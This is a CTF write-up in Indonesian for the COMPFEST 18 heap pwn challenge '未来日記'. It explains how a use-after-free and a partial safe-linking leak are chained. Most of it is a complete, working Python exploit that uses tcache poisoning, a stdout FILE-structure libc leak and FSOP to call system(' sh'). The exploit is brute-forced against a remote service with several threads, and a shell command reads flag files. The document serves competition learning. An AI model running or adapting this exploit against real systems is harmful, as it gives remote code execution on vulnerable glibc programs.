---
title: "未来日記"
ctf: "COMPFEST 18"
date: 2026-08-31
category: pwn
difficulty: hard
points: 0
flag_format: "COMPFEST18{...}"
author: "nata"
---

# 未来日記

## Summary

Challenge ini adalah heap pwn berbasis menu dengan tiga bug yang bisa dirangkai langsung: `delete()` tidak men-null pointer, `edit()` tetap boleh menulis ke chunk yang sudah di-`free`, dan `predict()` membocorkan 4 bit bawah dari safe-linking key. Solve akhirnya memakai tcache dup + 1-byte poisoning untuk mendapat arbitrary allocation ke heap, lalu partial overwrite ke `_IO_2_1_stdout_` untuk leak libc, dan finish dengan FSOP `system(" sh")`.

## Solution

### Step 1: Bangun primitive heap dari UAF + partial safe-linking leak

Observasi dari source:

- `delete()` hanya memanggil `free(nikkis[idx])` tanpa `nikkis[idx] = NULL`
- `edit()` melakukan `read(0, nikkis[idx], sizes[idx])`, jadi chunk freed masih bisa ditulis
- `predict()` mengambil `((unsigned short)test) >> 12`, jadi kita dapat nibble bawah dari `(heap_ptr >> 12)`

Layout yang dipakai solver:

- alokasikan chunk filler `0x460`, sehingga `idx0` jatuh di `heap+0x780`
- tcache entry nyata untuk size `0x3e0` berada di `heap+0x700`
- karena target dan sumber cuma beda 1 byte penting di low address, poisoning cukup butuh 1 byte safe-linking key

Akibatnya ruang brute force turun jadi:

- 16 tebakan untuk nibble atas byte key heap
- 16 tebakan untuk nibble libc yang dipakai saat partial overwrite `_IO_2_1_stdout_`
- total efektif `1/256` per koneksi

### Step 2: Leak libc dan pivot ke shell via stdout FSOP

Setelah `idx2` berhasil diarahkan ke `heap+0x700`, solver memakai double-protect style relinking:

- bentuk chunk unsorted agar ada pointer libc yang bisa dibaca
- arahkan alokasi `0x400` ke `_IO_2_1_stdout_` dengan partial overwrite low 2 byte
- tulis fake stdout ber-flag `0xfbad1800` untuk memaksa leak libc

Begitu base libc dapat:

- hitung `system`
- hitung `__wfile_jumps`
- bangun fake wide data / fake vtable di sekitar objek stdout
- overwrite stdout sehingga output berikutnya mengeksekusi `system(" sh")`

Solver lalu mengirim:

```bash
echo PWNED; cat flag.txt 2>/dev/null; cat /srv/app/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; id; exit
```

Bug output awal saya bukan di exploit, tapi di decoding: hasil remote sempat di-print sebagai `latin-1`, sehingga karakter UTF-8 Jepang di flag berubah jadi mojibake. Versi final menyimpan dan mencetak flag sebagai raw bytes.

```python
#!/usr/bin/env python3
import argparse
import fcntl
import os
import random
import re
import select
import socket
import struct
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

BIN = './chall'
LD = './ld-linux-x86-64.so.2'
LIBPATH = '.'
OFF_STDOUT = 0x2355c0
OFF_SYSTEM = 0x5c4c0
OFF_WFILE_JUMPS = 0x233228
LIBC_LEAK_OFFS = [0x234b20, 0x2348e0, 0x235644, 0x2355c0, 0x2354e0]
FLAG_RE = re.compile(rb'[A-Za-z0-9_{}-]+\{[^\r\n}]+\}')

def p16(x): return struct.pack('<H', x & 0xffff)
def p64(x): return struct.pack('<Q', x & 0xffffffffffffffff)
def u64(b): return struct.unpack('<Q', b.ljust(8, b'\0')[:8])[0]

class Tube:
    def __init__(self, host=None, port=None, connect_timeout=8.0):
        self.local = host is None
        self.buf = bytearray()
        if self.local:
            self.p = subprocess.Popen([LD, '--library-path', LIBPATH, BIN],
                                      stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE, bufsize=0)
            self.s = None
            for fd in [self.p.stdout.fileno(), self.p.stderr.fileno()]:
                fcntl.fcntl(fd, fcntl.F_SETFL, fcntl.fcntl(fd, fcntl.F_GETFL) | os.O_NONBLOCK)
        else:
            self.p = None
            self.s = socket.create_connection((host, int(port)), timeout=connect_timeout)
            self.s.settimeout(connect_timeout)
            self.s.setblocking(False)

    def close(self):
        try:
            if self.s: self.s.close()
        except Exception:
            pass
        try:
            if self.p: self.p.kill()
        except Exception:
            pass

    def alive(self):
        return self.p.poll() is None if self.local else True

    def _read_once(self, n=4096):
        if self.local:
            try: return os.read(self.p.stdout.fileno(), n)
            except BlockingIOError: return b''
        try: return self.s.recv(n)
        except (BlockingIOError, socket.timeout): return b''

    def _wait_readable(self, timeout):
        rfd = self.p.stdout if self.local else self.s
        r, _, _ = select.select([rfd], [], [], timeout)
        return bool(r)

    def recv(self, timeout=0.2):
        out = bytes(self.buf)
        self.buf.clear()
        end = time.time() + timeout
        while time.time() < end:
            if self._wait_readable(0.01):
                c = self._read_once(4096)
                if not c: break
                out += c
                end = time.time() + 0.05
            elif self.local and not self.alive():
                break
        return out

    def recvuntil(self, tok, timeout=2.0):
        tok = bytes(tok)
        data = bytearray()
        if self.buf:
            pos = self.buf.find(tok)
            if pos != -1:
                end = pos + len(tok)
                out = bytes(self.buf[:end])
                del self.buf[:end]
                return out
            data.extend(self.buf)
            self.buf.clear()
        end = time.time() + timeout
        while time.time() < end:
            if self._wait_readable(0.01):
                c = self._read_once(4096)
                if not c: break
                data.extend(c)
                pos = data.find(tok)
                if pos != -1:
                    endpos = pos + len(tok)
                    self.buf.extend(data[endpos:])
                    return bytes(data[:endpos])
            elif self.local and not self.alive():
                break
        raise TimeoutError(f'recvuntil timeout: {tok!r}')

    def send(self, b):
        if isinstance(b, str): b = b.encode()
        if self.local:
            self.p.stdin.write(b)
            self.p.stdin.flush()
            return
        view = memoryview(b)
        while view:
            try:
                sent = self.s.send(view)
                if sent == 0:
                    raise EOFError('remote closed connection during send')
                view = view[sent:]
            except BlockingIOError:
                _, w, _ = select.select([], [self.s], [], 0.05)
                if not w:
                    continue

    def sl(self, x):
        if isinstance(x, int): x = str(x).encode()
        elif isinstance(x, str): x = x.encode()
        self.send(x + b'\n')

    def add(self, idx, size):
        self.recvuntil(b'>> '); self.sl(1)
        self.recvuntil(b'idx: '); self.sl(idx)
        self.recvuntil(b'size: '); self.sl(size)

    def delete(self, idx):
        self.recvuntil(b'>> '); self.sl(2)
        self.recvuntil(b'idx: '); self.sl(idx)

    def edit(self, idx, data):
        self.recvuntil(b'>> '); self.sl(3)
        self.recvuntil(b'idx: '); self.sl(idx)
        self.recvuntil(b'content: '); self.send(data)

    def blind_edit(self, idx, data):
        self.send(b'3\n'); self.recv(0.04)
        self.send(str(idx).encode() + b'\n'); self.recv(0.04)
        self.send(data); self.recv(0.08)

def parse_libc(leak):
    for off in range(0, min(len(leak), 0x400) - 7):
        q = u64(leak[off:off+8])
        for ko in LIBC_LEAK_OFFS:
            base = q - ko
            if (base & 0xfff) == 0 and 0x700000000000 <= base <= 0x7fffffffffff:
                return base
    return None

def predict(io):
    io.recvuntil(b'>> '); io.sl(4)
    out = io.recvuntil(b'\n', timeout=1.0)
    m = re.search(rb'TAKE THIS: ([0-9a-fA-F]+)', out)
    if not m:
        raise RuntimeError('no predict leak')
    return int(m.group(1), 16)

def attempt(host, port, khi, lg, connect_timeout=8.0):
    io = Tube(host, port, connect_timeout=connect_timeout)
    try:
        fill = 0x460
        tcache_ptr = 0x700
        unsorted_user = 0x7b0

        io.recvuntil(b'yo', timeout=2.0)
        io.add(6, fill)
        io.add(0, 0x20)
        sec = predict(io)
        key8 = ((khi & 0xf) << 4) | (sec & 0xf)

        io.delete(0)
        io.edit(0, b'\0' * 16)
        io.delete(0)
        io.edit(0, bytes([(tcache_ptr & 0xff) ^ key8]))
        io.add(1, 0x20)
        io.add(2, 0x20)

        io.add(3, 0x410)
        io.add(4, 0x30)
        io.add(0, 0x3e0)
        io.add(1, 0x400)
        io.add(5, 0x400)

        io.delete(1)
        io.delete(5)
        io.edit(2, b'A' * 16 + p16((sec << 12) + tcache_ptr))
        io.delete(0)
        io.delete(3)
        io.edit(2, p16((sec << 12) + unsorted_user))
        io.add(0, 0x3e0)
        io.add(1, 0x400)

        stdout_low = ((lg & 0xf) << 12) + OFF_STDOUT
        io.edit(1, b'B' * 16 + p16(stdout_low))
        io.add(0, 0x400)

        io.edit(0, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
        leak = io.recv(0.9)
        libc = parse_libc(leak)
        if libc is None:
            return None

        stdout = libc + OFF_STDOUT
        system = libc + OFF_SYSTEM
        wfile_jumps = libc + OFF_WFILE_JUMPS
        fake_wide = stdout + 0x100
        fake_wvt = stdout + 0x300

        payload = bytearray(0x400)
        payload[0:8] = b' sh\0\0\0\0'
        def w(off, val): payload[off:off+8] = p64(val)
        w(0x20, 0); w(0x28, 1); w(0x30, 0); w(0x38, 0); w(0x40, 0)
        w(0x88, stdout + 0x500)
        w(0xa0, fake_wide)
        w(0xd8, wfile_jumps)
        w(0x100 + 0x18, 0)
        w(0x100 + 0x30, 0)
        w(0x100 + 0xe0, fake_wvt)
        w(0x300 + 0x68, system)
        io.blind_edit(0, bytes(payload))
        time.sleep(0.15)
        io.send(b'echo PWNED; cat flag.txt 2>/dev/null; cat /srv/app/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; id; exit\n')
        out = io.recv(2.0)
        return out if b'PWNED' in out else None
    finally:
        io.close()

def run_remote(host, port, jobs=8, max_tries=2048, timeout=8.0, sleep=0.02):
    pairs = [(k, l) for k in range(16) for l in range(16)]
    random.shuffle(pairs)
    tries = 0
    lock = threading.Lock()
    stop = threading.Event()
    found = {'out': None}

    def take_job():
        nonlocal tries
        with lock:
            if max_tries and tries >= max_tries:
                return None
            idx = tries
            tries += 1
            return tries, pairs[idx % len(pairs)]

    def worker():
        while not stop.is_set():
            job = take_job()
            if job is None:
                return
            cur, (k, l) = job
            if cur % 16 == 1:
                print(f'[*] try {cur}...', flush=True)
            out = attempt(host, port, k, l, connect_timeout=timeout)
            if out:
                with lock:
                    if not stop.is_set():
                        found['out'] = out
                        stop.set()
                return
            if sleep:
                time.sleep(sleep)

    with ThreadPoolExecutor(max_workers=jobs) as pool:
        for _ in range(jobs):
            pool.submit(worker)
    return found['out']

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    ap.add_argument('--jobs', type=int, default=8)
    ap.add_argument('--max-tries', type=int, default=2048)
    ap.add_argument('--timeout', type=float, default=8.0)
    ap.add_argument('--sleep', type=float, default=0.02)
    args = ap.parse_args()
    out = run_remote(args.host, args.port, args.jobs, args.max_tries, args.timeout, args.sleep)
    if not out:
        raise SystemExit('no success')
    sys.stdout.buffer.write(out)
    if not out.endswith(b'\n'):
        sys.stdout.buffer.write(b'\n')
    m = FLAG_RE.search(out)
    if m:
        sys.stdout.buffer.write(b'[FLAG] ' + m.group(0) + b'\n')

if __name__ == '__main__':
    main()
```

### Step 3: Verifikasi

Command yang dipakai:

```bash
python3 solve.py 34.2.147.230 5001 --max-tries 512
```

Output sukses:

```text
[*] target: 34.2.147.230:5001
[*] no token mode: service should show yo / add-delete-edit menu directly
[*] remote brute: probabilistic; success chance about 1/256 per connection
[*] timeout=8.0s sleep=0.02s jobs=8 max_tries=512
...
PWNED
COMPFEST18{さぁ_E1n5_zW31_Dr3i_重なり合う_fdf0b744ee277fcc}
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
[FLAG] COMPFEST18{さぁ_E1n5_zW31_Dr3i_重なり合う_fdf0b744ee277fcc}
```

## Flag

```text
COMPFEST18{さぁ_E1n5_zW31_Dr3i_重なり合う_fdf0b744ee277fcc}
```
